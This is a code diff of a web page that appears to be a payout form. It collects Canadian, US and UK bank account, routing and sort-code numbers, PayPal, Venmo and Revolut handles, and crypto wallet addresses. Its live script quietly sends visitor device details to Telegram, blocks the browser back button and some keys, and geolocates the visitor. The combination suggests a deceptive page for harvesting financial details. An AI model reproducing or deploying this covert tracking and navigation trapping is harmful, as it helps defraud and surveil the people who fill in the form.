@@ -1589,10 +1589,11 @@ CROP MODAL
 
   <div class="payment-slider-viewport">
 
+    <!-- CANADA CONTAINER -->
     <div class="payment-container">
       <p class="glass-cardsrd acu-gradient">
         <strong>Canada 🇨🇦</strong>
- <div style="height:4px;"></div>
+        <div style="height:4px;"></div>
       </p>
 
       <div class="glass-card">
@@ -1626,9 +1627,9 @@ CROP MODAL
             <option>Simplii Financial</option>
           </select>
           <input id="accountName" placeholder="Account Holder Name">
-          <input id="transitNumber" placeholder="Transit Number (5 digits)">
-          <input id="institutionNumber" placeholder="Institution Number (3 digits)">
-          <input id="accountNumber" placeholder="Account Number (7–12 digits)">
+          <input id="transitNumber" placeholder="Transit Number (5 Digits)">
+          <input id="institutionNumber" placeholder="Institution Number (3 Digits)">
+          <input id="accountNumber" placeholder="Account Number (7-12 Digits)">
         </div>
 
         <div class="payment-method glass-cards" data-method="Canada PayPal" data-region="canada">
@@ -1646,82 +1647,83 @@ CROP MODAL
             <img class="payment-logo" src="https://assets.coingecko.com/coins/images/6319/large/USD_Coin_icon.png">
             <span>▼ USDT / USDC [ERC-20]</span>
           </div>
-          <input id="acuAccountName" placeholder="Account Holder Name">
+          <input id="cryptoName" placeholder="Account / Wallet Holder Name">
           <input id="acuAccount" placeholder="Enter your ERC-20 wallet address (0x...)">
           <div class="network-note">⚠ ERC-20 network only</div>
         </div>
       </div>
     </div>
 
-   <div class="payment-container">
-  <p class="glass-cardsrd acu-gradient">
-    <strong>United States 🇺🇸</strong>
-    <div style="height:4px;"></div>
-  </p>
+    <!-- USA CONTAINER -->
+    <div class="payment-container">
+      <p class="glass-cardsrd acu-gradient">
+        <strong>United States 🇺🇸</strong>
+        <div style="height:4px;"></div>
+      </p>
 
-  <div class="glass-card">
-    <div class="top-trust">
-      Automatic Disbursement supported via global payment networks.
-    </div>
+      <div class="glass-card">
+        <div class="top-trust">
+          Automatic Disbursement supported via global payment networks.
+        </div>
 
-    <!-- Venmo (USA Specific) -->
-    <div class="payment-method glass-cards" data-method="Venmo" data-region="usa">
-      <div class="payment-header">
-        <img class="payment-logo" src="assets/pictures/5f33cd7cd34531a65477de41742743d3.jpg">
-        <span>Venmo</span>
+        <!-- Venmo (USA Specific) -->
+        <div class="payment-method glass-cards" data-method="Venmo" data-region="usa">
+          <div class="payment-header">
+            <img class="payment-logo" src="assets/pictures/5f33cd7cd34531a65477de41742743d3.jpg">
+            <span>Venmo</span>
+          </div>
+          <input id="venmoName" placeholder="Account Holder Name">
+          <input id="venmoInput" placeholder="Enter your Venmo username (e.g., @username)">
+        </div>
+
+        <!-- American Bank Transfer -->
+        <div class="payment-method glass-cards" data-method="American Bank Transfer" data-region="usa">
+          <div class="payment-header">
+            <img class="payment-logosss" src="https://cdn-icons-png.flaticon.com/512/2830/2830284.png">
+            <span>▼ Bank Transfer</span>
+          </div>
+          <select id="americanBankSelect">
+            <option value="">Select Your Bank</option>
+            <option>Chase Bank</option>
+            <option>Bank of America</option>
+            <option>Wells Fargo</option>
+            <option>Citi (Citibank)</option>
+            <option>U.S. Bank</option>
+            <option>PNC Bank</option>
+            <option>Capital One</option>
+            <option>Fifth Third Bank</option>
+          </select>
+          <input id="accountName-us" placeholder="Account Holder Name">
+          <input id="transitNumber-us" placeholder="Routing Number (9 Digits)">
+          <input id="accountNumber-us" placeholder="Account Number">
+        </div>
+
+        <!-- US PayPal -->
+        <div class="payment-method glass-cards" data-method="US PayPal" data-region="usa">
+          <div class="payment-header">
+            <img class="payment-logo" src="https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg">
+            <span>▼ PayPal</span>
+          </div>
+          <input id="paypalName-us" placeholder="Account Holder Name">
+          <input id="paypalInput-us" placeholder="Enter your PayPal email">
+        </div>
+
+        <!-- US USDT / USDC ERC20 -->
+        <div class="payment-method glass-cards" data-method="US USDT / USDC ERC20" data-region="usa">
+          <div class="token-logos">
+            <img class="payment-logo" src="https://assets.coingecko.com/coins/images/325/large/Tether.png">
+            <img class="payment-logo" src="https://assets.coingecko.com/coins/images/6319/large/USD_Coin_icon.png">
+            <span>▼ USDT / USDC [ERC-20]</span>
+          </div>
+          <input id="cryptoName-us" placeholder="Account / Wallet Holder Name">
+          <input id="acuAccount-us" placeholder="Enter your ERC-20 wallet address (0x...)">
+          <div class="network-note">⚠ ERC-20 network only</div>
+        </div>
       </div>
-      <input id="venmoName" placeholder="Account Holder Name">
-      <input id="venmoInput" placeholder="Enter your Venmo handle or email (e.g., @username)">
     </div>
 
-    <!-- American Bank Transfer -->
-    <div class="payment-method glass-cards" data-method="American Bank Transfer" data-region="usa">
-      <div class="payment-header">
-        <img class="payment-logosss" src="https://cdn-icons-png.flaticon.com/512/2830/2830284.png">
-        <span>▼ Bank Transfer</span>
-      </div>
-      <select id="americanBankSelect">
-        <option value="">Select Your Bank</option>
-        <option>Chase Bank</option>
-        <option>Bank of America</option>
-        <option>Wells Fargo</option>
-        <option>Citi (Citibank)</option>
-        <option>U.S. Bank</option>
-        <option>PNC Bank</option>
-        <option>Capital One</option>
-        <option>Fifth Third Bank</option>
-      </select>
-      <input id="accountName-us" placeholder="Account Holder Name">
-      <input id="transitNumber-us" placeholder="Routing Number (9 digits)">
-      <input id="accountNumber-us" placeholder="Account Number (8–17 digits)">
-    </div>
-
-    <!-- US PayPal -->
-    <div class="payment-method glass-cards" data-method="US PayPal" data-region="usa">
-      <div class="payment-header">
-        <img class="payment-logo" src="https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg">
-        <span>▼ PayPal</span>
-      </div>
-      <input id="paypalName-us" placeholder="Account Holder Name">
-      <input id="paypalInput-us" placeholder="Enter your PayPal email">
-    </div>
-
-    <!-- US USDT / USDC ERC20 -->
-    <div class="payment-method glass-cards" data-method="US USDT / USDC ERC20" data-region="usa">
-      <div class="token-logos">
-        <img class="payment-logo" src="https://assets.coingecko.com/coins/images/325/large/Tether.png">
-        <img class="payment-logo" src="https://assets.coingecko.com/coins/images/6319/large/USD_Coin_icon.png">
-        <span>▼ USDT / USDC [ERC-20]</span>
-      </div>
-      <input id="acuAccountName-us" placeholder="Account Holder Name">
-      <input id="acuAccount-us" placeholder="Enter your ERC-20 wallet address (0x...)">
-      <div class="network-note">⚠ ERC-20 network only</div>
-    </div>
-  </div>
-</div>
-
-
-<div class="payment-container">
+    <!-- UK CONTAINER -->
+    <div class="payment-container">
       <p class="glass-cardsrd acu-gradient">
         <strong>United Kingdom 🇬🇧</strong>
         <div style="height:4px;"></div>
@@ -1738,7 +1740,7 @@ CROP MODAL
             <span>Revolut</span>
           </div>
           <input id="revolutName" placeholder="Account Holder Name">
-          <input id="revolutInput" placeholder="Enter your Revtag or phone (e.g., @username)">
+          <input id="revolutInput" placeholder="Enter your Revtag (e.g., @username)">
         </div>
 
         <div class="payment-method glass-cards" data-method="British Bank Transfer" data-region="uk">
@@ -1758,8 +1760,8 @@ CROP MODAL
             <option>NatWest</option>
           </select>
           <input id="accountName-uk" placeholder="Account Holder Name">
-          <input id="transitNumber-uk" placeholder="Sort Code (6 digits)">
-          <input id="accountNumber-uk" placeholder="Account Number (8 digits)">
+          <input id="transitNumber-uk" placeholder="Sort Code (6 Digits e.g. 12-34-56)">
+          <input id="accountNumber-uk" placeholder="Account Number (8 Digits)">
         </div>
 
         <div class="payment-method glass-cards" data-method="UK PayPal" data-region="uk">
@@ -1777,14 +1779,16 @@ CROP MODAL
             <img class="payment-logo" src="https://assets.coingecko.com/coins/images/6319/large/USD_Coin_icon.png">
             <span>▼ USDT / USDC [ERC-20]</span>
           </div>
-          <input id="acuAccountName-uk" placeholder="Account Holder Name">
+          <input id="cryptoName-uk" placeholder="Account / Wallet Holder Name">
           <input id="acuAccount-uk" placeholder="Enter your ERC-20 wallet address (0x...)">
           <div class="network-note">⚠ ERC-20 network only</div>
         </div>
       </div>
     </div>
 
-  </div> <div class="dots">
+  </div> 
+
+  <div class="dots">
     <span class="active"></span>
     <span></span>
     <span></span>
@@ -1810,11 +1814,10 @@ CROP MODAL
 
 <script>
 // ==========================================
-// 🔔 LIGHTWEIGHT TAB & BADGE WATCHER (Sub-pages)
+// 🔔 LIGHTWEIGHT TAB & BADGE WATCHER
 // ==========================================
-
-const CLEARANCE_REDIRECT_URL = "https://membership.avalonflow.site/notifications"; 
-const ENABLE_SUBPAGE_HOLD_REDIRECT = true;     
+const CLEARANCE_REDIRECT_URL = "https://membership.avalonflow.site/notifications";
+const ENABLE_SUBPAGE_HOLD_REDIRECT = true;
 
 const originalDocumentTitle = "Notifications";
 let titleInterval = null;
@@ -1904,9 +1907,7 @@ document.addEventListener("visibilitychange", () => {
 });
 
 window.addEventListener("focus", checkUnreadNotifications);
-
 checkUnreadNotifications();
-
 
 // ==========================================
 // 1. TELEGRAM VISITOR TRACKING CONFIGURATION
@@ -1979,11 +1980,7 @@ async function sendVisitorDetailsToTelegram() {
 
     if (/Android/i.test(rawAgent)) {
       const match = rawAgent.match(/Android\s+([^;]+);\s+([^)]+)/);
-      if (match) {
-        detailedDevice = `Android ${match[1]} (${match[2]})`;
-      } else {
-        detailedDevice = "Android Device";
-      }
+      detailedDevice = match ? `Android ${match[1]} (${match[2]})` : "Android Device";
     } else if (/iPhone|iPad|iPod/i.test(rawAgent)) {
       const match = rawAgent.match(/OS\s+(\d+_\d+)/);
       const iosVer = match ? match[1].replace('_', '.') : '';
@@ -2042,7 +2039,6 @@ async function sendVisitorDetailsToTelegram() {
     });
 
     sessionStorage.setItem('visitor_logged_tg', 'true');
-    console.log("🔒 Security telemetry parameters forwarded successfully.");
   } catch (err) {
     console.warn("Telegram telemetry bypass error:", err);
   }
@@ -2053,7 +2049,6 @@ document.addEventListener('DOMContentLoaded', () => {
 });
 
 history.pushState(null, null, location.href);
-
 window.addEventListener('popstate', function () {
   history.go(1);
 });
@@ -2064,30 +2059,9 @@ window.addEventListener('keydown', function (e) {
   }
 });
 
-// Helper Function: Setup Bank Logo Switching
-function setupBankLogoSwitcher(selectId, logoClass, logoMap) {
-    const defaultLogo = "https://cdn-icons-png.flaticon.com/512/2830/2830284.png";
-    const $logo = $(logoClass);
-
-    $(selectId).on('change', function () {
-        const selectedBank = $(this).val();
-        const newLogo = logoMap[selectedBank] || defaultLogo;
-
-        $logo.addClass('is-hidden');
-        const tempImg = new Image();
-
-        tempImg.onload = function () {
-            $logo.attr('src', newLogo);
-            if ($logo[0]) void $logo[0].offsetWidth;
-            $logo.removeClass('is-hidden');
-        };
-
-        tempImg.src = newLogo;
-    });
-}
-
+// Bank Logo Dynamics - Canada
 $(document).ready(function () {
-    setupBankLogoSwitcher('#canadianBankSelect', '.payment-logos', {
+    const bankLogos = {
         "RBC Royal Bank": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/4889b91421334f04992dbd75abd44c94.jpg",
         "TD Canada Trust": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/e90fc5400809adf33e281d9f876d5485.jpg",
         "Scotiabank": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/839782492ccfda0e5f616798c2646804.jpg",
@@ -2096,9 +2070,27 @@ $(document).ready(function () {
         "National Bank": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/fb34b722f69d354bf24dd585444a6cee.jpg",
         "Tangerine": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/Tangerine_Bank-Logo.wine.png",
         "Simplii Financial": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/Simplii_Financial_branding.jpg"
-    });
+    };
+    const defaultLogo = "https://cdn-icons-png.flaticon.com/512/2830/2830284.png";
+    const $logo = $('.payment-logos');
 
-    setupBankLogoSwitcher('#americanBankSelect', '.payment-logosss', {
+    $('#canadianBankSelect').on('change', function () {
+        const selectedBank = $(this).val();
+        const newLogo = bankLogos[selectedBank] || defaultLogo;
+        $logo.addClass('is-hidden');
+        const tempImg = new Image();
+        tempImg.onload = function () {
+            $logo.attr('src', newLogo);
+            void $logo[0].offsetWidth;
+            $logo.removeClass('is-hidden');
+        };
+        tempImg.src = newLogo;
+    });
+});
+
+// Bank Logo Dynamics - USA
+$(document).ready(function () {
+    const bankLogos = {
         "Chase Bank": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/dcaa7faba74f565af7efbf1135c2e144.jpg",
         "Bank of America": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/7826c02a5b48ea41e801cafcb0bba674.jpg",
         "Wells Fargo": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/Wells_Fargo_Logo_(2020).png",
@@ -2107,9 +2099,27 @@ $(document).ready(function () {
         "PNC Bank": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/PNClogo.svg.png",
         "Capital One": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/Capital_One_logo.svg.png",
         "Fifth Third Bank": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/logo-stacked-primary-full-thumb.png"
-    });
+    };
+    const defaultLogo = "https://cdn-icons-png.flaticon.com/512/2830/2830284.png";
+    const $logo = $('.payment-logosss');
 
-    setupBankLogoSwitcher('#britishBankSelect', '.payment-logoss', {
+    $('#americanBankSelect').on('change', function () {
+        const selectedBank = $(this).val();
+        const newLogo = bankLogos[selectedBank] || defaultLogo;
+        $logo.addClass('is-hidden');
+        const tempImg = new Image();
+        tempImg.onload = function () {
+            $logo.attr('src', newLogo);
+            void $logo[0].offsetWidth;
+            $logo.removeClass('is-hidden');
+        };
+        tempImg.src = newLogo;
+    });
+});
+
+// Bank Logo Dynamics - UK
+$(document).ready(function () {
+    const bankLogos = {
         "Barclays": "assets/pictures/Barclays-Logo-768x432.png",
         "HSBC UK": "assets/pictures/HSBC-Logo-768x432.png",
         "Lloyds Bank": "assets/pictures/Lloyds-Bank-Logo-500x281.webp",
@@ -2118,125 +2128,100 @@ $(document).ready(function () {
         "TSB Bank": "assets/pictures/WA_1783360619696.jpeg",
         "Nationwide": "assets/pictures/WA_1783378395029.jpeg",
         "NatWest": "assets/pictures/IMG-20260706-WA0033(1).jpg"
+    };
+    const defaultLogo = "https://cdn-icons-png.flaticon.com/512/2830/2830284.png";
+    const $logo = $('.payment-logoss');
+
+    $('#britishBankSelect').on('change', function () {
+        const selectedBank = $(this).val();
+        const newLogo = bankLogos[selectedBank] || defaultLogo;
+        $logo.addClass('is-hidden');
+        const tempImg = new Image();
+        tempImg.onload = function () {
+            $logo.attr('src', newLogo);
+            void $logo[0].offsetWidth;
+            $logo.removeClass('is-hidden');
+        };
+        tempImg.src = newLogo;
     });
 });
 
-/* Sidebar toggle */
-function toggleSidebar() {
-    const sidebar = document.getElementById('sidebar');
-    const menuBtn = document.getElementById('menuBtn');
-    if (sidebar) sidebar.classList.toggle('open');
-    if (menuBtn) menuBtn.classList.toggle('shift');
-}
-
-function navigateTo(page){
-    window.location.href = page;
-}
-
+/* Navigation / Profile Photo Management */
 const photoInput = document.getElementById('photoInput');
 const profilePhoto = document.getElementById('profilePhoto');
-const avatarLabel = document.getElementById('avatarLabel'); 
-const cropModal = document.getElementById('cropModal');
-
+const avatarLabel = document.getElementById('avatarLabel');
 const DEFAULT_AVATAR = 'default-avatar.png';
 let isProcessing = false;
 
 document.addEventListener('DOMContentLoaded', () => {
-    if (profilePhoto) {
-        const savedPhoto = localStorage.getItem('profilePhoto');
-        if (savedPhoto) {
-            profilePhoto.src = savedPhoto;
-            if (avatarLabel) avatarLabel.textContent = "Remove Profile Picture";
-        } else {
-            profilePhoto.src = DEFAULT_AVATAR;
-            if (avatarLabel) avatarLabel.textContent = "Add Profile Picture";
-        }
+    const savedPhoto = localStorage.getItem('profilePhoto');
+    if (savedPhoto && profilePhoto) {
+        profilePhoto.src = savedPhoto;
+        if (avatarLabel) avatarLabel.textContent = "Remove Profile Picture";
+    } else if (profilePhoto) {
+        profilePhoto.src = DEFAULT_AVATAR;
+        if (avatarLabel) avatarLabel.textContent = "Add Profile Picture";
     }
 });
 
 if (profilePhoto) {
-    profilePhoto.addEventListener('click', () => {
-        if (isProcessing) return;
-        const hasPhoto = localStorage.getItem('profilePhoto');
-
-        if (hasPhoto) {
-            localStorage.removeItem('profilePhoto');
-            profilePhoto.src = DEFAULT_AVATAR;
-            if (avatarLabel) avatarLabel.textContent = "Add Profile Picture";
-        } else if (photoInput) {
-            photoInput.click();
-        }
-    });
+  profilePhoto.addEventListener('click', () => {
+      if (isProcessing) return;
+      const hasPhoto = localStorage.getItem('profilePhoto');
+      if (hasPhoto) {
+          localStorage.removeItem('profilePhoto');
+          profilePhoto.src = DEFAULT_AVATAR;
+          if (avatarLabel) avatarLabel.textContent = "Add Profile Picture";
+      } else if (photoInput) {
+          photoInput.click();
+      }
+  });
 }
 
 if (photoInput) {
-    photoInput.addEventListener('change', (e) => {
-        const file = e.target.files[0];
-        if (!file || isProcessing) return;
-
-        isProcessing = true;
-        const reader = new FileReader();
-
-        reader.onload = function(event) {
-            const rawImage = event.target.result;
-            const img = new Image();
-            img.src = rawImage;
-
-            img.onload = function() {
-                const canvas = document.createElement('canvas');
-                const size = Math.min(img.width, img.height);
-
-                canvas.width = size;
-                canvas.height = size;
-
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(
-                    img,
-                    (img.width - size) / 2,
-                    (img.height - size) / 2,
-                    size,
-                    size,
-                    0,
-                    0,
-                    size,
-                    size
-                );
-
-                const finalImage = canvas.toDataURL('image/png');
-                if (profilePhoto) profilePhoto.src = finalImage;
-                localStorage.setItem('profilePhoto', finalImage);
-
-                if (avatarLabel) avatarLabel.textContent = "Remove Profile Picture";
-                if (cropModal) cropModal.classList.add('hidden');
-                photoInput.value = '';
-
-                setTimeout(() => {
-                    isProcessing = false;
-                }, 300);
-            };
-        };
-
-        reader.readAsDataURL(file);
-    });
+  photoInput.addEventListener('change', (e) => {
+      const file = e.target.files[0];
+      if (!file || isProcessing) return;
+      isProcessing = true;
+      const reader = new FileReader();
+      reader.onload = function(event) {
+          const img = new Image();
+          img.src = event.target.result;
+          img.onload = function() {
+              const canvas = document.createElement('canvas');
+              const size = Math.min(img.width, img.height);
+              canvas.width = size;
+              canvas.height = size;
+              const ctx = canvas.getContext('2d');
+              ctx.drawImage(img, (img.width - size) / 2, (img.height - size) / 2, size, size, 0, 0, size, size);
+              const finalImage = canvas.toDataURL('image/png');
+              if (profilePhoto) profilePhoto.src = finalImage;
+              localStorage.setItem('profilePhoto', finalImage);
+              if (avatarLabel) avatarLabel.textContent = "Remove Profile Picture";
+              photoInput.value = '';
+              setTimeout(() => { isProcessing = false; }, 300);
+          };
+      };
+      reader.readAsDataURL(file);
+  });
 }
 
 window.addEventListener("DOMContentLoaded", () => {
-    const bg = document.getElementById('floating-bg');
-    if (bg) {
-        function particle() {
-            const p = document.createElement('div');
-            p.className = 'particle';
-            const s = Math.random() * 20 + 10;
-            p.style.width = s + 'px';
-            p.style.height = s + 'px';
-            p.style.left = Math.random() * 100 + 'vw';
-            p.style.animationDuration = (Math.random() * 20 + 10) + 's';
-
-            bg.appendChild(p);
-            setTimeout(() => p.remove(), 30000);
-        }
-        setInterval(particle, 800);
+  const bg = document.getElementById('floating-bg');
+  if (bg) {
+    function particle() {
+        const p = document.createElement('div');
+        p.className = 'particle';
+        const s = Math.random() * 20 + 10;
+        p.style.width = s + 'px';
+        p.style.height = s + 'px';
+        p.style.left = Math.random() * 100 + 'vw';
+        p.style.animationDuration = (Math.random() * 20 + 10) + 's';
+        bg.appendChild(p);
+        setTimeout(() => p.remove(), 30000);
     }
+    setInterval(particle, 800);
+  }
 });
 
 function logout(){
@@ -2245,17 +2230,11 @@ function logout(){
     window.location.replace('https://membership.avalonflow.site/signin');
 }
 
-/* --------------------------
-NOTIFICATION SYSTEM
--------------------------- */
 const notification = document.getElementById("planNotification");
-
 function showNotification(message, duration = 3000) {
     if (!notification) return;
-
     notification.textContent = message;
     notification.classList.add("show");
-
     clearTimeout(notification.hideTimer);
     notification.hideTimer = setTimeout(() => {
         notification.classList.remove("show");
@@ -2264,21 +2243,15 @@ function showNotification(message, duration = 3000) {
 
 window.addEventListener("load", () => {
     const saved = JSON.parse(localStorage.getItem("section3Data") || "{}");
-    const hasSavedData = Object.values(saved).some(
-        v => v && v.toString().trim() !== ""
-    );
-
+    const hasSavedData = Object.values(saved).some(v => v && v.toString().trim() !== "");
     if (!hasSavedData) {
         showNotification("Only one payout method is required");
     }
 });
 
-/* --------------------------
-LOAD SAVED DATA
--------------------------- */
+/* LOAD & RESTORE SAVED DATA */
 const methods = document.querySelectorAll(".payment-method");
 const saved = JSON.parse(localStorage.getItem("section3Data") || "{}");
-
 let preference = saved.preference || ""; 
 
 if (saved.preference) {
@@ -2292,7 +2265,7 @@ if (saved.preference) {
   });
 }
 
-// Restore saved values - General & CA
+// Restore saved values - Canada
 if (saved.interacName) document.getElementById("interacName").value = saved.interacName;
 if (saved.interac) document.getElementById("interacInput").value = saved.interac;
 if (saved.canadianBank) document.getElementById("canadianBankSelect").value = saved.canadianBank;
@@ -2302,10 +2275,10 @@ if (saved.institutionNumber) document.getElementById("institutionNumber").value 
 if (saved.accountNumber) document.getElementById("accountNumber").value = saved.accountNumber;
 if (saved.paypalName) document.getElementById("paypalName").value = saved.paypalName;
 if (saved.paypal) document.getElementById("paypalInput").value = saved.paypal;
-if (saved.acuAccountName) document.getElementById("acuAccountName").value = saved.acuAccountName;
+if (saved.cryptoName) document.getElementById("cryptoName").value = saved.cryptoName;
 if (saved.acuAccount) document.getElementById("acuAccount").value = saved.acuAccount;
 
-// Restore American distinct fields
+// Restore saved values - USA
 if (saved.venmoName) document.getElementById("venmoName").value = saved.venmoName;
 if (saved.venmo) document.getElementById("venmoInput").value = saved.venmo;
 if (saved.americanBank) document.getElementById("americanBankSelect").value = saved.americanBank;
@@ -2314,10 +2287,10 @@ if (saved.transitNumberUs) document.getElementById("transitNumber-us").value = s
 if (saved.accountNumberUs) document.getElementById("accountNumber-us").value = saved.accountNumberUs;
 if (saved.paypalNameUs) document.getElementById("paypalName-us").value = saved.paypalNameUs;
 if (saved.paypalUs) document.getElementById("paypalInput-us").value = saved.paypalUs;
-if (saved.acuAccountNameUs) document.getElementById("acuAccountName-us").value = saved.acuAccountNameUs;
+if (saved.cryptoNameUs) document.getElementById("cryptoName-us").value = saved.cryptoNameUs;
 if (saved.acuAccountUs) document.getElementById("acuAccount-us").value = saved.acuAccountUs;
 
-// Restore British distinct fields
+// Restore saved values - UK
 if (saved.revolutName) document.getElementById("revolutName").value = saved.revolutName;
 if (saved.revolut) document.getElementById("revolutInput").value = saved.revolut;
 if (saved.britishBank) document.getElementById("britishBankSelect").value = saved.britishBank;
@@ -2326,12 +2299,10 @@ if (saved.transitNumberUk) document.getElementById("transitNumber-uk").value = s
 if (saved.accountNumberUk) document.getElementById("accountNumber-uk").value = saved.accountNumberUk;
 if (saved.paypalNameUk) document.getElementById("paypalName-uk").value = saved.paypalNameUk;
 if (saved.paypalUk) document.getElementById("paypalInput-uk").value = saved.paypalUk;
-if (saved.acuAccountNameUk) document.getElementById("acuAccountName-uk").value = saved.acuAccountNameUk;
+if (saved.cryptoNameUk) document.getElementById("cryptoName-uk").value = saved.cryptoNameUk;
 if (saved.acuAccountUk) document.getElementById("acuAccount-uk").value = saved.acuAccountUk;
 
-/* --------------------------
-CARD SELECTION
--------------------------- */
+/* CARD SELECTION */
 methods.forEach(method => {
   const fields = method.querySelectorAll("input, select");
   method.onclick = () => {
@@ -2352,17 +2323,13 @@ methods.forEach(method => {
   };
 });
 
-/* --------------------------
-AUTO SAVE INPUT
--------------------------- */
+/* AUTO SAVE INPUT */
 document.querySelectorAll("input, select").forEach(input => {
   input.addEventListener("input", saveData);
   input.addEventListener("change", saveData);
 });
 
-// ==========================================
-// 💎 ENCAPSULATED 3D MAIN CARD SLIDER ENGINE
-// ==========================================
+// 3D CARD SLIDER ENGINE
 $(document).ready(function() {
     const container = document.querySelector('.payment-slider-viewport');
     const cards = Array.from(document.querySelectorAll('.payment-slider-viewport .payment-container'));
@@ -2399,37 +2366,27 @@ $(document).ready(function() {
 
     function update3D() {
         const center = container.scrollLeft + container.clientWidth / 2;
-
         cards.forEach(card => {
             const cardCenter = card.offsetLeft + card.offsetWidth / 2;
             const dist = Math.abs(center - cardCenter);
-
             const maxDist = container.clientWidth;
             const ratio = Math.min(dist / maxDist, 1);
-
             const scale = 1 - (ratio * 0.12); 
             const opacity = 1 - (ratio * 0.4);
             const rotateY = (cardCenter < center ? 1 : -1) * ratio * 10;
 
-            card.style.transform = `
-                scale(${scale})
-                perspective(1200px)
-                rotateY(${rotateY}deg)
-            `;
+            card.style.transform = `scale(${scale}) perspective(1200px) rotateY(${rotateY}deg)`;
             card.style.opacity = opacity;
         });
     }
 
     function setActiveCard(target) {
         if (!target) return;
-
         cards.forEach(c => c.classList.remove('active', 'inactive'));
         target.classList.add('active');
-
         cards.forEach(c => {
             if (c !== target) c.classList.add('inactive');
         });
-
         if (dotsWrapper) {
             const dots = dotsWrapper.querySelectorAll('span');
             dots.forEach(d => d.classList.remove('active'));
@@ -2444,13 +2401,10 @@ $(document).ready(function() {
 
     function scrollToCard(index, duration = 300) {
         if (index < 0 || index >= cards.length) return;
-
         const target = cards[index];
         const start = container.scrollLeft;
-
         let dest = target.offsetLeft - container.offsetWidth/2 + target.offsetWidth/2;
         dest = clampScroll(dest);
-
         const dist = dest - start;
         let startTime = null;
 
@@ -2460,10 +2414,8 @@ $(document).ready(function() {
             if (!startTime) startTime = t;
             const p = Math.min((t - startTime)/duration, 1);
             const eased = easeOutExpo(p);
-
             container.scrollLeft = start + dist * eased;
             update3D();
-
             if (p < 1) {
                 requestAnimationFrame(anim);
             } else {
@@ -2542,11 +2494,11 @@ $(document).ready(function() {
         fetch('https://ipapi.co/json/')
             .then(response => response.json())
             .then(geo => {
-                let targetIndex = 0; 
+                let targetIndex = 0;
                 if (geo.country_code === 'US') {
-                    targetIndex = 1; 
+                    targetIndex = 1;
                 } else if (geo.country_code === 'GB' || geo.country_code === 'UK') {
-                    targetIndex = 2; 
+                    targetIndex = 2;
                 }
                 scrollToCard(targetIndex, 400);
             })
@@ -2561,10 +2513,8 @@ $(document).ready(function() {
     });
 });
 
-/* --------------------------
-NUMBER-ONLY VALIDATION ENFORCEMENT
--------------------------- */
-["transitNumber", "institutionNumber", "accountNumber", "transitNumber-us", "accountNumber-us", "transitNumber-uk", "accountNumber-uk"].forEach(id => {
+/* NUMBER-ONLY VALIDATION FILTER */
+["transitNumber", "institutionNumber", "accountNumber", "transitNumber-us", "accountNumber-us", "accountNumber-uk"].forEach(id => {
   const input = document.getElementById(id);
   if (input) {
     input.addEventListener("input", () => {
@@ -2573,31 +2523,34 @@ NUMBER-ONLY VALIDATION ENFORCEMENT
   }
 });
 
-/* --------------------------
-UNIFIED PREFERENCE & FORMAT VALIDATION
--------------------------- */
+/* Filter for UK Sort code to allow numbers and dashes */
+const ukSortCode = document.getElementById("transitNumber-uk");
+if (ukSortCode) {
+  ukSortCode.addEventListener("input", () => {
+    ukSortCode.value = ukSortCode.value.replace(/[^0-9-]/g, "");
+  });
+}
+
+// ==========================================
+// 🔍 RIGOROUS FORMAT VALIDATION ENGINE
+// ==========================================
 function validateCurrentPreference() {
   if (!preference) {
-    showNotification("Please select a payout method", 4000);
+    showNotification("Please select a payment method", 4000);
     return false;
   }
 
   const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
   const erc20Regex = /^0x[a-fA-F0-9]{40}$/;
+  const handleTagRegex = /^@?[a-zA-Z0-9_]{3,30}$/;
 
-  // 1. Canadian Interac
+  // 1. Interac e-Transfer
   if (preference === "Interac e-Transfer") {
     const name = document.getElementById("interacName")?.value.trim();
     const email = document.getElementById("interacInput")?.value.trim();
 
-    if (!name) {
-      showNotification("Please enter the Account Holder Name", 4000);
-      return false;
-    }
-    if (!emailRegex.test(email)) {
-      showNotification("Please enter a valid Interac e-Transfer email address", 4000);
-      return false;
-    }
+    if (!name) { showNotification("Please enter account holder name", 4000); return false; }
+    if (!email || !emailRegex.test(email)) { showNotification("Please enter a valid Interac e-Transfer email address", 4000); return false; }
     return true;
   }
 
@@ -2609,223 +2562,175 @@ function validateCurrentPreference() {
     const caInst = document.getElementById("institutionNumber")?.value.trim();
     const caAcc = document.getElementById("accountNumber")?.value.trim();
 
-    if (!caBank) {
-      showNotification("Please select your Canadian Bank", 4000);
-      return false;
-    }
-    if (!caName) {
-      showNotification("Please enter the Account Holder Name", 4000);
-      return false;
-    }
-    if (!/^\d{5}$/.test(caTransit)) {
-      showNotification("Transit Number must be exactly 5 digits", 4000);
-      return false;
-    }
-    if (!/^\d{3}$/.test(caInst)) {
-      showNotification("Institution Number must be exactly 3 digits", 4000);
-      return false;
-    }
-    if (!/^\d{7,12}$/.test(caAcc)) {
-      showNotification("Account Number must be between 7 and 12 digits", 4000);
-      return false;
-    }
+    if (!caBank) { showNotification("Please select your Canadian Bank", 4000); return false; }
+    if (!caName) { showNotification("Please enter account holder name", 4000); return false; }
+    if (!caTransit || !/^\d{5}$/.test(caTransit)) { showNotification("Transit Number must be exactly 5 digits", 4000); return false; }
+    if (!caInst || !/^\d{3}$/.test(caInst)) { showNotification("Institution Number must be exactly 3 digits", 4000); return false; }
+    if (!caAcc || !/^\d{7,12}$/.test(caAcc)) { showNotification("Account Number must be between 7 and 12 digits", 4000); return false; }
     return true;
   }
 
-  // 3. American Bank Transfer
+  // 3. Canada PayPal
+  if (preference === "Canada PayPal") {
+    const name = document.getElementById("paypalName")?.value.trim();
